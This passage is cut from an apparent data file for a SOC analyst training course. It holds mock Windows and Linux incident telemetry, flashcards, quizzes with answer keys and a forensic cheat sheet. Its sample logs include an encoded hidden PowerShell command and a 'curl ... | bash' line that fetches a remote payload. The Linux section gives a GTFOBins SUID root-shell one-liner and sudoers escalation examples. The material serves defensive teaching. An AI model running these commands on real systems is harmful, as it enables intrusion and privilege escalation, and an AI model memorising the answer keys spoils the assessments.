            { id: 101, eventId: 4625, time: '14:02:11', user: 'adm_backup', logonType: 3, srcIp: '192.168.1.55', status: '0xC000006A', detail: 'Failed logon attempt - Bad password' },
            { id: 102, eventId: 4625, time: '14:02:14', user: 'adm_backup', logonType: 3, srcIp: '192.168.1.55', status: '0xC000006A', detail: 'Failed logon attempt - Bad password' },
            { id: 103, eventId: 4625, time: '14:02:18', user: 'adm_backup', logonType: 3, srcIp: '192.168.1.55', status: '0xC000006A', detail: 'Failed logon attempt - Bad password' },
            { id: 104, eventId: 4624, time: '14:02:25', user: 'adm_backup', logonType: 3, srcIp: '192.168.1.55', status: '0x0', detail: 'Successful network logon via SMB' },
            { id: 105, eventId: 7045, time: '14:02:38', user: 'SYSTEM', logonType: 0, srcIp: '127.0.0.1', status: '0x0', detail: 'Service Installed: Name=PSEXESVC ImagePath=C:\\Windows\\PSEXESVC.exe' },
            { id: 106, eventId: 4688, time: '14:02:40', user: 'adm_backup', logonType: 3, srcIp: '127.0.0.1', status: '0x0', detail: 'powershell.exe -NoP -NonI -W Hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==' }
          ]
        }
      },
      incident: {
        id: 'inc-1120',
        ticketNumber: 'SEC-1120',
        title: 'Lateral Movement Spike: Event 4625 Burst Followed by Event 7045 Service Install',
        severity: 'Critical',
        affectedAsset: 'DC-PRIMARY-01 (10.0.0.10)',
        timestamp: '2026-10-03 17:15:00 UTC',
        summary: 'SIEM correlation rule triggered: 45 failed logons (Event 4625) within 2 minutes followed by successful Event 4624 (Logon Type 3) for domain admin account "DA_Support", immediately followed by Event 7045 installing "PSEXESVC.exe".',
        rawTelemetry: [
          'EventID: 4625 TargetUserName: DA_Support WorkstationName: DESKTOP-J78X IpAddress: 10.0.5.210 SubStatus: 0xC000006A',
          'EventID: 4624 TargetUserName: DA_Support LogonType: 3 IpAddress: 10.0.5.210 AuthenticationPackage: NTLM',
          'EventID: 7045 ServiceName: PSEXESVC ServiceFileName: C:\\Windows\\PSEXESVC.exe ServiceType: user mode service',
          'EventID: 4688 NewProcessName: C:\\Windows\\System32\\cmd.exe CommandLine: cmd.exe /c whoami /priv > C:\\ProgramData\\out.txt'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'Brute force credential cracking against Domain Admin followed by successful network logon and PsExec service installation represents an active enterprise compromise.'
        },
        rootCauseOptions: {
          options: [
            'Adversary performed SMB password brute-forcing, gained access, and executed PsExec lateral movement to Domain Controller.',
            'IT automation software patching the Domain Controller with legitimate service update.',
            'Domain user resetting their password through the self-service web portal.',
            'Active Directory replication glitch causing temporary NTLM retry errors.'
          ],
          correctIndex: 0,
          explanation: 'The sequential pattern (4625 brute force -> 4624 Type 3 network logon -> 7045 PSEXESVC.exe -> cmd.exe executing reconnaissance) is classic PsExec lateral movement.'
        },
        containmentOptions: {
          options: [
            'Immediately isolate source machine DESKTOP-J78X (10.0.5.210), disable DA_Support account in Active Directory, terminate PSEXESVC on DC, and initiate enterprise-wide Kerberos KRBTGT password reset.',
            'Email the user of DESKTOP-J78X to ask if they installed PsExec.',
            'Restart the Domain Controller service to remove the temporary file.',
            'Whitelist the PSEXESVC service in antivirus to avoid recurring alerts.'
          ],
          correctIndex: 0,
          explanation: 'Since the Domain Controller was accessed by an attacker using a Domain Admin account, containment requires isolating the pivot host, revoking credentials, killing the malicious service, and escalating to Tier 3 for incident response.'
        },
        mitreTechniques: ['T1110.001 - Brute Force: Password Guessing', 'T1021.002 - Remote Services: SMB/Windows Admin Shares', 'T1543.003 - Create or Modify System Process: Windows Service'],
        slaMinutes: 15
      },
      flashcards: [
        {
          id: 'fc-1-7',
          question: 'What is the critical difference between Windows Event 4624 Logon Type 2 and Logon Type 3?',
          category: 'Windows Forensics',
          difficulty: 'Junior',
          modelAnswer: 'Logon Type 2 represents an Interactive logon, meaning the user physically sat in front of the machine and authenticated via the keyboard/console. Logon Type 3 represents a Network logon, where credentials were sent across the network to access a network share, printer, or administrative named pipe (such as SMB, PsExec, or IIS web access). Attackers moving laterally almost always generate Logon Type 3 events on target systems.',
          scoringTips: ['Define Type 2 as physical console/interactive.', 'Define Type 3 as network/SMB/remote share access.', 'Link Type 3 to adversary lateral movement.'],
          corporateContext: 'Fundamental question asked in almost every Junior SOC Analyst technical interview.'
        },
        {
          id: 'fc-1-8',
          question: 'In an Event 4625 log, what is the forensic importance of distinguishing substatus 0xC000006A from 0xC0000064?',
          category: 'Windows Forensics',
          difficulty: 'Mid',
          modelAnswer: 'Substatus code 0xC000006A indicates "STATUS_WRONG_PASSWORD" (the username exists in Active Directory, but the password provided was incorrect). Substatus code 0xC0000064 indicates "STATUS_NO_SUCH_USER" (the username does not exist in the domain). If an analyst sees thousands of 0xC0000064 codes, the attacker is enumerating usernames. If an analyst sees 0xC000006A against known accounts, they are conducting brute force or password spraying.',
          scoringTips: ['0xC000006A = existing account, bad password.', '0xC0000064 = non-existent account (user enumeration).', 'Explain the tactical difference between password spray and user harvest.'],
          corporateContext: 'Used to filter false positives from automated directory scanners.'
        },
        {
          id: 'fc-1-9',
          question: 'Why is Windows Event ID 7045 high priority for detection engineering?',
          category: 'Detection Engineering',
          difficulty: 'Mid',
          modelAnswer: 'Event ID 7045 is logged in the System event log whenever a new Windows Service is installed on the host. Adversaries use Windows Services for persistence (running automatically at system startup) and privilege escalation (services run as NT AUTHORITY\\SYSTEM by default). Additionally, lateral movement tools like PsExec dynamically install temporary services (like PSEXESVC.exe) to execute remote commands.',
          scoringTips: ['Explains service creation for persistence.', 'Explains privilege escalation to SYSTEM level.', 'Mentions PsExec and lateral movement tools.'],
          corporateContext: 'Core rule in all enterprise SIEM content libraries.'
        }
      ],
      quiz: [
        {
          id: 'q-1-7',
          question: 'An analyst spots Event ID 4624 with Logon Type 10. What type of logon occurred?',
          options: [
            'Physical keyboard interactive login at the local monitor.',
            'Remote desktop (RDP / Terminal Services) logon.',
            'Service account starting an automated background job.',
            'Network logon via SMB file sharing.'
          ],
          correctIndex: 1,
          explanation: 'Logon Type 10 is RemoteInteractive, specifically designating logons via Remote Desktop Protocol (RDP) or Terminal Services.'
        },
        {
          id: 'q-1-8',
          question: 'Which Event ID in the Windows System log directly signals that an adversary may have established persistence via a newly registered service?',
          options: ['Event ID 4624', 'Event ID 7045', 'Event ID 1102', 'Event ID 4688'],
          correctIndex: 1,
          explanation: 'Event ID 7045 ("A service was installed in the system") records service name, image file path, and service account, making it a premier indicator of persistence.'
        },
        {
          id: 'q-1-9',
          question: 'When analyzing Event ID 4688 (Process Creation), which configuration is necessary to see the actual commands executed (e.g. `powershell.exe -enc ...`)?',
          options: [
            'Enable BitLocker drive encryption',
            'Include command line in process creation events via GPO',
            'Disable Windows Defender SmartScreen',
            'Configure DNS scavenge intervals'
          ],
          correctIndex: 1,
          explanation: 'By default, Event 4688 only logs the process name. The Group Policy setting "Include command line in process creation events" must be explicitly enabled to capture arguments.'
        }
      ]
    },
    {
      id: 'linux-security',
      phaseId: 'phase-1',
      title: 'Linux Security Telemetry & System Forensics',
      subtitle: 'Syslog, /var/log/auth.log, File Permissions (chmod/chown), SUID/SGID, sudo, & systemd',
      estimatedMinutes: 25,
      iconName: 'Terminal',
      analogy: {
        headline: 'The Vault Master Keys and Night Shift Guard Ledger',
        story: 'On a Linux system, root is the king with omnipotent power. Regular users have locked office cubicles. File permissions (rwx) are like color-coded magnetic security cards: Read (4), Write (2), Execute (1). If you leave a file with 777 permissions, you have left the master cash register wide open on the sidewalk. SUID (Set Owner User ID) is like an employee borrowing the CEO master gold key to stamp a specific document. If an employee discovers that the stamp tool also lets them open any filing cabinet in the building (SUID privilege escalation via GTFOBins), they can take over the entire corporation.',
        keyTakeaway: 'Linux powers 90%+ of cloud workloads and containers. In the SOC, understanding `/var/log/auth.log`, SUID abuse, and suspicious systemd services is mandatory for cloud defense.'
      },
      corporateReality: {
        headline: 'Linux Host Monitoring, Privilege Escalation Vectors, and Auditd',
        deepDive: ["Linux security telemetry centers around syslog facilities:","- **Authentication Logs:** `/var/log/auth.log` (Ubuntu/Debian) or `/var/log/secure` (RHEL/CentOS). Logs SSH logins, failed passwords, and `sudo` command executions.","- **System Logs:** `/var/log/syslog`, `/var/log/messages`, and `journalctl -u <service>`.","- **File Permissions & Octal Notation:** Read (4), Write (2), Execute (1). `chmod 755` (rwxr-xr-x). The dangerous permission is **SUID (SetUID - Octal 4000)**. When set on a binary owned by root (e.g. `chmod 4755 /bin/custom`), any regular user executes it with root privileges. Attackers check GTFOBins to exploit SUID on binaries like `find`, `vim`, `bash`, or `cp` to pop an instant root shell (`find . -exec /bin/sh -p \\\\; -quit`).","- **Sudoers Abuse:** Misconfigurations in `/etc/sudoers` (e.g. `ALL=(ALL) NOPASSWD: /usr/bin/python3`) permit trivial root escalation.","- **Persistence:** Systemd service units in `/etc/systemd/system/` or cron jobs in `/etc/cron.*` and `/var/spool/cron/crontabs/`."].join('\n'),
        architectureNotes: [
          'Auditd Framework: Implement Linux Audit Daemon (`auditd`) with rules tracking `execve` system calls, `/etc/passwd` modifications, and SUID execution.',
          'SSH Hardening: Disable password authentication (`PasswordAuthentication no`), disable root login (`PermitRootLogin no`), enforce hardware FIDO2 keys.',
          'Immutable Attributes: Use `chattr +i` on critical configurations (`/etc/resolv.conf`, `/etc/passwd`) to thwart rapid tampering.',
          'Container Boundary Detection: Detect container escape attempts (inspecting `/proc/1/cgroup` and capabilities like `CAP_SYS_ADMIN`).'
        ],
        realWorldCase: 'During an intrusion on an e-commerce web farm, an attacker exploited an Apache Struts vulnerability to gain access as `www-data`. The attacker ran `find / -perm -4000 2>/dev/null`, discovered a custom backup script with SUID root permissions, injected a shell escape sequence, modified `/etc/shadow`, and added a persistent root backdoor.'
      },
      cheatSheet: {
        title: 'Linux Forensics & Privilege Auditing Command Sheet',
        description: 'Crucial Linux commands for investigating compromised servers, inspecting permissions, and detecting SUID escalation.',
        headers: ['Command', 'Purpose', 'Forensic Objective', 'Severity Risk'],
        rows: [
          {
            term: 'grep "Failed password" /var/log/auth.log',
            description: 'Inspect SSH brute-force attempts',
            commandOrId: '/var/log/auth.log',
            riskOrUsage: 'Identifies attacking source IP addresses and targeted usernames.',
            severity: 'Medium'
          },
          {
            term: 'grep -i "sudo:" /var/log/auth.log',
            description: 'Audit privilege escalation attempts',
            commandOrId: 'auth.log / journalctl',
            riskOrUsage: 'Displays who executed sudo, whether it succeeded, and what command was run.',
            severity: 'High'
          },
          {
            term: 'find / -perm -4000 -type f 2>/dev/null',
            description: 'Search all SUID binaries on disk',
            commandOrId: 'Host shell',
            riskOrUsage: 'Uncovers unusual SUID binaries vulnerable to GTFOBins root escape.',
            severity: 'Critical'
          },
          {
            term: 'crontab -l; cat /etc/crontab',
            description: 'Audit scheduled cron jobs',
            commandOrId: '/var/spool/cron/*',
            riskOrUsage: 'Detects persistence mechanisms running periodic reverse shells.',
            severity: 'High'
          },
          {
            term: 'systemctl list-unit-files --type=service',
            description: 'Audit systemd service persistence',
            commandOrId: 'systemd',
            riskOrUsage: 'Reveals rogue daemon services configured to survive server reboots.',
            severity: 'Medium'
          },
          {
            term: 'last -F -n 20; who -a',
            description: 'Historical and current user sessions',
            commandOrId: '/var/log/wtmp',
            riskOrUsage: 'Shows login timestamps, remote IP addresses, and active TTY shells.',
            severity: 'Low'
          }
        ]
      },
      sandboxType: 'linux-cli',
      sandboxConfig: {
        title: 'Linux Auth & Syslog Terminal Investigator',
        instructions: 'Run simulated Linux commands in the terminal (e.g. `cat /var/log/auth.log`, `grep Failed /var/log/auth.log`, `ls -la /tmp`, `find / -perm -4000`, `crontab -l`). Find the intrusion trace.',
        defaultData: {
          authLog: [
            'Oct 03 14:10:01 web-prod-02 sshd[1204]: Failed password for invalid user admin from 198.51.100.42 port 49122 ssh2',
            'Oct 03 14:10:04 web-prod-02 sshd[1205]: Failed password for invalid user admin from 198.51.100.42 port 49124 ssh2',
            'Oct 03 14:10:08 web-prod-02 sshd[1206]: Accepted publickey for deployer from 198.51.100.42 port 49130 ssh2: RSA SHA256:x7K...',
            'Oct 03 14:10:15 web-prod-02 sudo: deployer : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash'
          ],
          suidList: [
            '/usr/bin/passwd',
            '/usr/bin/chfn',
            '/usr/bin/sudo',
            '/tmp/.hidden/escalate (MODIFIED: Oct 3 14:11:00)'
          ]
        }
      },
      incident: {
        id: 'inc-1155',
        ticketNumber: 'SEC-1155',
        title: 'Unauthorized SUID Binary Drop and Root Sudo Execution in /tmp',
        severity: 'Critical',
        affectedAsset: 'WEB-PROD-02 (10.0.2.14)',
        timestamp: '2026-10-03 17:50:00 UTC',
        summary: 'Linux EDR detected binary creation with permissions 4755 (SUID root) in directory /tmp/.hidden/ followed by an immediate execution of /bin/sh with UID 0.',
        rawTelemetry: [
          '2026-10-03T17:48:12Z auditd: type=SYSCALL arch=c000003e syscall=268 (fchmodat) success=yes comm="chmod" a2=4755',
          '2026-10-03T17:48:15Z auditd: type=EXECVE comm="escalate" exe="/tmp/.hidden/escalate" euid=0 ruid=1001',
          '2026-10-03T17:48:20Z auth.log: sudo: deployer : TTY=pts/0 ; PWD=/tmp/.hidden ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.99/payload.sh | bash',
          'Process parent: sshd: deployer@pts/0 (Origin IP: 198.51.100.42)'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'Attacker compromised deployer SSH credentials, used SUID escalation in /tmp, and pulled a remote bash script as root.'
        },
        rootCauseOptions: {
          options: [
            'Adversary leveraged compromised deployer SSH key, compiled an SUID root binary in /tmp, and downloaded an external secondary payload.',
            'Developer running a standard Docker build container script.',
            'Linux kernel automatic security update rebooting services.',
            'Failed logrotate process archiving web server error logs.'
          ],
          correctIndex: 0,
          explanation: 'The audit logs specifically show a `chmod 4755` SUID permission change in `/tmp/.hidden/`, execution with effective UID 0 (root), followed by curl piping to bash.'
        },
        containmentOptions: {
          options: [
            'Immediately terminate deployer active SSH session (`pkill -u deployer`), isolate host from production VPC, revoke deployer authorized_keys, remove rogue SUID binary, and review auditd history.',
            'Change file permissions of `/tmp` to 777 to resolve conflicts.',
            'Leave the session open to observe what commands the attacker types.',
            'Disable syslog logging to prevent log file exhaustion.'
          ],
          correctIndex: 0,
          explanation: 'Containment requires severing active attacker TTY sessions, network isolation, credential revocation, artifact removal, and forensic timeline reconstruction.'
        },
        mitreTechniques: ['T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid', 'T1059.004 - Command and Scripting Interpreter: Unix Shell'],
        slaMinutes: 15
      },
      flashcards: [
        {
          id: 'fc-1-10',
          question: 'What is the SUID bit on Linux, what is its octal representation, and why is it dangerous?',
          category: 'Linux Forensics',
          difficulty: 'Mid',
          modelAnswer: 'SUID (Set Owner User ID) is a special Linux file permission represented by the octal digit 4 (e.g. 4755 or `rwsr-xr-x`). When an executable file with SUID is run by an unprivileged user, it executes with the privileges of the file owner (typically root) rather than the calling user. It is legitimate for tools like `/usr/bin/passwd` (so users can update `/etc/shadow`), but dangerous when applied to binaries like bash, python, or custom scripts, as attackers can abuse them via GTFOBins to gain an instant root shell.',
          scoringTips: ['State octal representation 4000.', 'Explain execution with file owner privileges.', 'Mention GTFOBins or shell escape vectors.'],
          corporateContext: 'A top interview question for Linux host intrusion analysis.'
        },
        {
          id: 'fc-1-11',
          question: 'Where are authentication logs stored on Debian/Ubuntu vs RHEL/CentOS systems, and what key patterns do you search for?',
          category: 'Linux Forensics',
          difficulty: 'Junior',
          modelAnswer: 'On Debian/Ubuntu systems, authentication telemetry is logged to `/var/log/auth.log`. On RHEL/CentOS/Fedora systems, it is logged to `/var/log/secure`. Analysts search for: 1) "Failed password" (brute-force attacks), 2) "Accepted publickey" or "Accepted password" (successful logins with IP/port), 3) "sudo:" (privilege escalation attempts and commands run), and 4) "session opened for user root" (root privilege escalation).',
          scoringTips: ['Differentiate /var/log/auth.log vs /var/log/secure.', 'Mention searching for Failed password and Accepted logins.', 'Mention tracking sudo commands.'],
          corporateContext: 'Standard knowledge check for entry-level SOC analysts.'
        },
        {
          id: 'fc-1-12',
          question: 'How do attackers maintain persistence on a Linux server using systemd?',
          category: 'Adversary TTPs',
          difficulty: 'Senior',
          modelAnswer: 'Adversaries create malicious `.service` unit files inside `/etc/systemd/system/` (or `/usr/lib/systemd/system/`). The unit file defines an `ExecStart` directive pointing to their backdoor payload or reverse shell, configured with `WantedBy=multi-user.target` and `Restart=always`. They then run `systemctl enable <service>`, guaranteeing their backdoor automatically restarts whenever the server reboots or crashes.',
          scoringTips: ['Mention creating .service files in /etc/systemd/system.', 'Mention ExecStart parameter with payload.', 'Mention systemctl enable for boot persistence.'],
          corporateContext: 'Key detection scenario for cloud server incident response.'
        }
      ],
      quiz: [
        {
          id: 'q-1-10',
          question: 'In Linux permissions, what does the command `chmod 4755 script.sh` set on the file?',
          options: [
            'Makes the file read-only for everyone.',
            'Sets the SUID (Set Owner User ID) bit along with standard rwxr-xr-x permissions.',
            'Deletes the file and creates a symbolic link to /dev/null.',
            'Encourages automatic cron job execution every 4 hours.'
          ],
          correctIndex: 1,
          explanation: 'The leading 4 in 4755 sets the SUID bit, causing the file to execute with the permissions of the file owner (typically root).'
        },
        {
          id: 'q-1-11',
          question: 'Which log file should a SOC analyst inspect on an Ubuntu server to investigate failed SSH login attempts and unauthorized sudo commands?',
          options: ['/var/log/boot.log', '/var/log/auth.log', '/var/log/dpkg.log', '/var/log/nginx/access.log'],
          correctIndex: 1,
          explanation: '`/var/log/auth.log` is the standard authentication log on Debian and Ubuntu systems, recording PAM, SSH, and sudo events.'
        },
        {
          id: 'q-1-12',
          question: 'What is GTFOBins in the context of cybersecurity and penetration testing?',
          options: [
            'A commercial firewall appliance vendor',
            'A curated repository of Unix binaries that can be exploited to bypass local security restrictions and escalate privileges',
            'A cryptographic hash generator for malware analysis',
            'An automated patch management system for Red Hat Enterprise Linux'
          ],
          correctIndex: 1,
          explanation: 'GTFOBins is a well-known community repository detailing how standard Linux binaries (like vim, find, nmap) can be abused when SUID or sudo misconfigurations exist.'
        }
      ]
    }
  ]
};
